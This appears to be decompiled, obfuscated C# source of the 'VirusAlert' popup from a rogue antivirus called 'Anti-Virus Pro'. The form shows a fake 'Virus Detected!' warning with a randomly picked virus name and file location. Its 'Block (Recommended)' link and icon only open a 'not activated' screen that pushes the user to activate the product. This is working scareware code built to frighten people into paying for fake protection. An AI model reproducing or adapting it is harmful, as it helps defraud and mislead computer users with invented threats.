using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

public sealed class VirusAlert : Form
{
	private IContainer icontainer_0;

	private Class7 CustomPanel3;

	private Label lblCompStatus;

	private Class7 CustomPanel1;

	private PictureBox pictureBox1;

	private Class7 CustomPanel4;

	private Class7 CustomPanel2;

	private LinkLabel linkLabel1;

	private Label label1;

	private Label label3;

	private Label label2;

	private Class7 CustomPanel5;

	private Label label4;

	private LinkLabel linkLocation;

	private LinkLabel linkVirus;

	private Class7 CustomPanel6;

	private PictureBox pictureBox2;

	private PictureBox pictureBox3;

	private Label label7;

	private Label label8;

	private CheckBox chkApply;

	private Class7 CustomPanel7;

	private LinkLabel linkLabel4;

	private LinkLabel linkLabel5;

	private LinkLabel linkLabel6;

	public VirusAlert()
	{
		InitializeComponent();
		((Form)this).set_Location(new Point(Screen.get_PrimaryScreen().get_WorkingArea().Right - ((Control)this).get_Width(), Screen.get_PrimaryScreen().get_WorkingArea().Bottom - ((Control)this).get_Height()));
		string text = Class6.string_5[new Random().Next(0, Class6.string_5.Length - 1)];
		string string_ = Class6.string_4[new Random().Next(0, Class6.string_4.Length - 1)];
		((Control)linkLocation).set_Text(Class15.smethod_3(string_, 40));
		((Control)linkVirus).set_Text(text);
	}

	public VirusAlert(string string_0)
	{
		InitializeComponent();
		((Form)this).set_Location(new Point(Screen.get_PrimaryScreen().get_WorkingArea().Right - ((Control)this).get_Width(), Screen.get_PrimaryScreen().get_WorkingArea().Bottom - ((Control)this).get_Height()));
		string text = Class6.string_5[new Random().Next(0, Class6.string_5.Length - 1)];
		((Control)linkLocation).set_Text(Class15.smethod_3(string_0, 40));
		((Control)linkVirus).set_Text(text);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		//IL_072c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0736: Expected O, but got Unknown
		//IL_0914: Unknown result type (might be due to invalid IL or missing references)
		//IL_091e: Expected O, but got Unknown
		//IL_09d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09db: Expected O, but got Unknown
		//IL_0b8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b98: Expected O, but got Unknown
		//IL_0c4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c58: Expected O, but got Unknown
		//IL_0e74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7e: Expected O, but got Unknown
		//IL_0f24: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2e: Expected O, but got Unknown
		CustomPanel3 = new Class7();
		lblCompStatus = new Label();
		CustomPanel1 = new Class7();
		CustomPanel4 = new Class7();
		chkApply = new CheckBox();
		linkLabel1 = new LinkLabel();
		linkLocation = new LinkLabel();
		linkVirus = new LinkLabel();
		label3 = new Label();
		label2 = new Label();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		CustomPanel2 = new Class7();
		linkLabel5 = new LinkLabel();
		label8 = new Label();
		pictureBox2 = new PictureBox();
		CustomPanel6 = new Class7();
		linkLabel6 = new LinkLabel();
		label7 = new Label();
		pictureBox3 = new PictureBox();
		CustomPanel5 = new Class7();
		linkLabel4 = new LinkLabel();
		CustomPanel7 = new Class7();
		label4 = new Label();
		((Control)CustomPanel3).SuspendLayout();
		((Control)CustomPanel1).SuspendLayout();
		((Control)CustomPanel4).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)CustomPanel2).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)CustomPanel6).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((Control)CustomPanel5).SuspendLayout();
		((Control)CustomPanel7).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)CustomPanel3).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Panel)CustomPanel3).set_BorderStyle((BorderStyle)1);
		((Control)CustomPanel3).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)CustomPanel3).set_Dock((DockStyle)1);
		((Control)CustomPanel3).set_Location(new Point(0, 0));
		((Control)CustomPanel3).set_Name("CustomPanel3");
		((Control)CustomPanel3).set_Size(new Size(302, 26));
		((Control)CustomPanel3).set_TabIndex(34);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(95, 4));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(110, 16));
		((Control)lblCompStatus).set_TabIndex(0);
		((Control)lblCompStatus).set_Text("Virus Detected!");
		((Panel)CustomPanel1).set_BorderStyle((BorderStyle)1);
		CustomPanel1.method_5(Color.FromArgb(207, 207, 207));
		((Control)CustomPanel1).get_Controls().Add((Control)(object)CustomPanel4);
		((Control)CustomPanel1).get_Controls().Add((Control)(object)CustomPanel2);
		((Control)CustomPanel1).set_Dock((DockStyle)5);
		((Control)CustomPanel1).set_Location(new Point(0, 26));
		((Control)CustomPanel1).set_Name("CustomPanel1");
		((Control)CustomPanel1).set_Size(new Size(302, 392));
		((Control)CustomPanel1).set_TabIndex(35);
		((Control)CustomPanel4).set_BackColor(Color.FromArgb(243, 244, 245));
		CustomPanel4.method_5(Color.FromArgb(233, 233, 233));
		((Control)CustomPanel4).get_Controls().Add((Control)(object)chkApply);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)linkLabel1);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)linkLocation);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)linkVirus);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)label3);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)label2);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)label1);
		((Control)CustomPanel4).get_Controls().Add((Control)(object)pictureBox1);
		((Control)CustomPanel4).set_Dock((DockStyle)5);
		((Control)CustomPanel4).set_Location(new Point(0, 0));
		((Control)CustomPanel4).set_Name("CustomPanel4");
		((Control)CustomPanel4).set_Size(new Size(300, 204));
		((Control)CustomPanel4).set_TabIndex(2);
		((Control)chkApply).set_AutoSize(true);
		((Control)chkApply).set_Location(new Point(175, 181));
		((Control)chkApply).set_Name("chkApply");
		((Control)chkApply).set_Size(new Size(114, 17));
		((Control)chkApply).set_TabIndex(7);
		((Control)chkApply).set_Text("Apply to all objects");
		((ButtonBase)chkApply).set_UseVisualStyleBackColor(true);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Location(new Point(265, 11));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(29, 13));
		((Control)linkLabel1).set_TabIndex(1);
		((Label)linkLabel1).set_TabStop(true);
		((Control)linkLabel1).set_Text("Help");
		((Control)linkLocation).set_AutoSize(true);
		((Control)linkLocation).set_Location(new Point(12, 101));
		((Control)linkLocation).set_Name("linkLocation");
		((Control)linkLocation).set_Size(new Size(226, 26));
		((Control)linkLocation).set_TabIndex(6);
		((Label)linkLocation).set_TabStop(true);
		((Control)linkLocation).set_Text("HKEY_CURRENT_USER\\Software\\Microsoft\r\n\\Windows\\CurrentVersion\\Run;");
		((Control)linkVirus).set_AutoSize(true);
		((Control)linkVirus).set_Location(new Point(12, 158));
		((Control)linkVirus).set_Name("linkVirus");
		((Control)linkVirus).set_Size(new Size(55, 13));
		((Control)linkVirus).set_TabIndex(5);
		((Label)linkVirus).set_TabStop(true);
		((Control)linkVirus).set_Text("Test.COM");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(12, 141));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(33, 13));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("Virus:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(12, 84));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(88, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("File or Webpage:");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label1).set_Location(new Point(74, 25));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(199, 30));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("This file or webpage contains \r\nmalicious software.");
		pictureBox1.set_Image((Image)(object)Class3.smethod_26());
		((Control)pictureBox1).set_Location(new Point(15, 16));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(55, 51));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)CustomPanel2).get_Controls().Add((Control)(object)linkLabel5);
		((Control)CustomPanel2).get_Controls().Add((Control)(object)label8);
		((Control)CustomPanel2).get_Controls().Add((Control)(object)pictureBox2);
		((Control)CustomPanel2).get_Controls().Add((Control)(object)CustomPanel6);
		((Control)CustomPanel2).get_Controls().Add((Control)(object)CustomPanel5);
		CustomPanel2.method_5(Color.FromArgb(233, 233, 233));
		((Control)CustomPanel2).set_Dock((DockStyle)2);
		((Control)CustomPanel2).set_Location(new Point(0, 204));
		((Control)CustomPanel2).set_Name("CustomPanel2");
		((Control)CustomPanel2).set_Size(new Size(300, 186));
		((Control)CustomPanel2).set_TabIndex(1);
		((Control)linkLabel5).set_AutoSize(true);
		((Control)linkLabel5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel5).set_ForeColor(Color.Teal);
		linkLabel5.set_LinkBehavior((LinkBehavior)3);
		linkLabel5.set_LinkColor(Color.FromArgb(57, 47, 172));
		((Control)linkLabel5).set_Location(new Point(68, 12));
		((Control)linkLabel5).set_Name("linkLabel5");
		((Control)linkLabel5).set_Size(new Size(36, 15));
		((Control)linkLabel5).set_TabIndex(16);
		((Label)linkLabel5).set_TabStop(true);
		((Control)linkLabel5).set_Text("Allow");
		linkLabel5.set_VisitedLinkColor(Color.Teal);
		linkLabel5.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel5_LinkClicked));
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(68, 31));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(132, 13));
		((Control)label8).set_TabIndex(15);
		((Control)label8).set_Text("The action will be allowed.");
		((Control)label8).add_Click((EventHandler)pictureBox2_Click);
		pictureBox2.set_Image((Image)(object)Class3.smethod_4());
		((Control)pictureBox2).set_Location(new Point(12, 12));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(38, 37));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(12);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)CustomPanel6).get_Controls().Add((Control)(object)linkLabel6);
		((Control)CustomPanel6).get_Controls().Add((Control)(object)label7);
		((Control)CustomPanel6).get_Controls().Add((Control)(object)pictureBox3);
		((Control)CustomPanel6).set_Dock((DockStyle)2);
		((Control)CustomPanel6).set_Location(new Point(0, 64));
		((Control)CustomPanel6).set_Name("CustomPanel6");
		((Control)CustomPanel6).set_Size(new Size(300, 76));
		((Control)CustomPanel6).set_TabIndex(11);
		((Control)linkLabel6).set_AutoSize(true);
		((Control)linkLabel6).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel6).set_ForeColor(Color.Teal);
		linkLabel6.set_LinkBehavior((LinkBehavior)3);
		linkLabel6.set_LinkColor(Color.FromArgb(57, 47, 172));
		((Control)linkLabel6).set_Location(new Point(69, 13));
		((Control)linkLabel6).set_Name("linkLabel6");
		((Control)linkLabel6).set_Size(new Size(153, 15));
		((Control)linkLabel6).set_TabIndex(17);
		((Label)linkLabel6).set_TabStop(true);
		((Control)linkLabel6).set_Text("Block (Recommended)");
		linkLabel6.set_VisitedLinkColor(Color.Teal);
		linkLabel6.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel6_LinkClicked));
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(69, 33));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(134, 13));
		((Control)label7).set_TabIndex(14);
		((Control)label7).set_Text("The action will be blocked.");
		((Control)label7).add_Click((EventHandler)pictureBox3_Click);
		pictureBox3.set_Image((Image)(object)Class3.smethod_4());
		((Control)pictureBox3).set_Location(new Point(12, 13));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(38, 37));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox3.set_TabIndex(13);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox3).add_Click((EventHandler)pictureBox3_Click);
		((Control)CustomPanel5).set_BackColor(Color.FromArgb(243, 244, 245));
		((Control)CustomPanel5).get_Controls().Add((Control)(object)linkLabel4);
		((Control)CustomPanel5).get_Controls().Add((Control)(object)CustomPanel7);
		((Control)CustomPanel5).set_Dock((DockStyle)2);
		((Control)CustomPanel5).set_Location(new Point(0, 140));
		((Control)CustomPanel5).set_Name("CustomPanel5");
		((Control)CustomPanel5).set_Size(new Size(300, 46));
		((Control)CustomPanel5).set_TabIndex(10);
		((Control)linkLabel4).set_AutoSize(true);
		((Control)linkLabel4).set_Location(new Point(74, 27));
		((Control)linkLabel4).set_Name("linkLabel4");
		((Control)linkLabel4).set_Size(new Size(156, 13));
		((Control)linkLabel4).set_TabIndex(2);
		((Label)linkLabel4).set_TabStop(true);
		((Control)linkLabel4).set_Text("Click here to activate your copy");
		linkLabel4.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel4_LinkClicked));
		((Control)CustomPanel7).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Control)CustomPanel7).get_Controls().Add((Control)(object)label4);
		((Control)CustomPanel7).set_Dock((DockStyle)1);
		((Control)CustomPanel7).set_Location(new Point(0, 0));
		((Control)CustomPanel7).set_Name("CustomPanel7");
		((Control)CustomPanel7).set_Size(new Size(300, 23));
		((Control)CustomPanel7).set_TabIndex(1);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(9, 3));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(285, 15));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("Warning! This copy of Anti-Virus Pro is not activated.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(302, 418));
		((Control)this).get_Controls().Add((Control)(object)CustomPanel1);
		((Control)this).get_Controls().Add((Control)(object)CustomPanel3);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("VirusAlert");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("VirusAlert");
		((Form)this).set_TopMost(true);
		((Control)CustomPanel3).ResumeLayout(false);
		((Control)CustomPanel3).PerformLayout();
		((Control)CustomPanel1).ResumeLayout(false);
		((Control)CustomPanel4).ResumeLayout(false);
		((Control)CustomPanel4).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)CustomPanel2).ResumeLayout(false);
		((Control)CustomPanel2).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)CustomPanel6).ResumeLayout(false);
		((Control)CustomPanel6).PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		((Control)CustomPanel5).ResumeLayout(false);
		((Control)CustomPanel5).PerformLayout();
		((Control)CustomPanel7).ResumeLayout(false);
		((Control)CustomPanel7).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void pictureBox3_Click(object sender, EventArgs e)
	{
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
		((Form)this).Close();
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
	}

	private void method_0(object sender, EventArgs e)
	{
		Cursor.set_Current(Cursors.get_Default());
	}

	private void linkLabel6_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
		((Form)this).Close();
	}

	private void linkLabel5_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		((Form)this).Close();
	}

	private void method_1(object sender, PaintEventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		Pen val = new Pen(Color.FromArgb(207, 207, 207));
		e.get_Graphics().DrawRectangle(val, e.get_ClipRectangle().Left, e.get_ClipRectangle().Top, e.get_ClipRectangle().Width - 1, e.get_ClipRectangle().Height - 1);
		((Form)this).OnPaint(e);
	}

	private void method_2(object sender, PaintEventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		Pen val = new Pen(Color.FromArgb(233, 233, 233));
		e.get_Graphics().DrawRectangle(val, e.get_ClipRectangle().Left, e.get_ClipRectangle().Top, e.get_ClipRectangle().Width - 1, e.get_ClipRectangle().Height - 1);
		((Form)this).OnPaint(e);
	}

	private void method_3(object sender, EventArgs e)
	{
		Cursor.set_Current(Cursors.get_Default());
	}

	private void method_4(object sender, PaintEventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		Pen val = new Pen(Color.FromArgb(233, 233, 233));
		e.get_Graphics().DrawRectangle(val, e.get_ClipRectangle().Left, e.get_ClipRectangle().Top, e.get_ClipRectangle().Width - 1, e.get_ClipRectangle().Height - 1);
	}
}
